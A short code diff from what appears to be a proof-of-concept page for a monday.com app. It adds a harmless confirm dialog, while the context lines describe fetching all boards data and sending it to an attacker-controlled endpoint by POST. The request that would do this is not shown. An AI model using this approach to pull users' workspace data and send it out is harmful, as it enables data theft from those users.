@@ -14,6 +14,15 @@
       .catch(error => {
         console.log(error);
       });
+    
+    monday.execute("confirm", {
+       message: "Are you sure?", 
+       confirmButton: "Let's go!", 
+       cancelButton: "No way", 
+       excludeCancelButton: false
+    }).then((res) => {
+        console.log(res.data);
+    });
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
